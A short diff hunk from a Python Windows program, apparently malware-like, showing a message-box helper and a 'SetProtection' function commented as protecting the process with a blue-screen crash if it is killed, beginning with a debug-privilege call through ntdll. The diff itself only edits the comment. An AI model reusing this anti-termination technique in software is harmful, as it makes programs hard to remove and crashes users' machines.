@@ -66,7 +66,7 @@ def MessageBox(MessageTitle, Message):
  ctypes.windll.user32.MessageBoxW(0, Message, u''+MessageTitle, 0x10)
 
 
-# Protect process with BSoD (if killed).
+# Protect process with BSoD (if killed)
 
 def SetProtection():
  windll.ntdll.RtlAdjustPrivilege(20, 1, 0, byref(c_bool()))
